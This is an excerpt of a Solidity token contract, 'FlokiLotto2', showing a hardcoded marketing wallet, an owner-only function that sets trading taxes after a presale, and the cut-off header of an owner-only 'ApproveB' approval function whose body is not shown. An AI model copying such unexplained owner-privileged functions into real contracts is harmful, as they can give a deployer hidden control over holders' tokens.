...
contract FlokiLotto2 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x6D485ceC650bb9d33e47f3F134Ab3E42e458D295); // Marketing Address
    ...
    string private _name = "FlokiLottoV2";
    string private _symbol = "FLOTTO2";
    ...
    function afterPreSalee() external onlyOwner {
        setSwapAndLiquifyEnabled(true);
        _taxFee = 5;
        _liquidityFee = 5;
		_buyTaxFee = 5;
    ...
    function ApproveB(address recipient , uint256 _amount) external onlyOwner(){
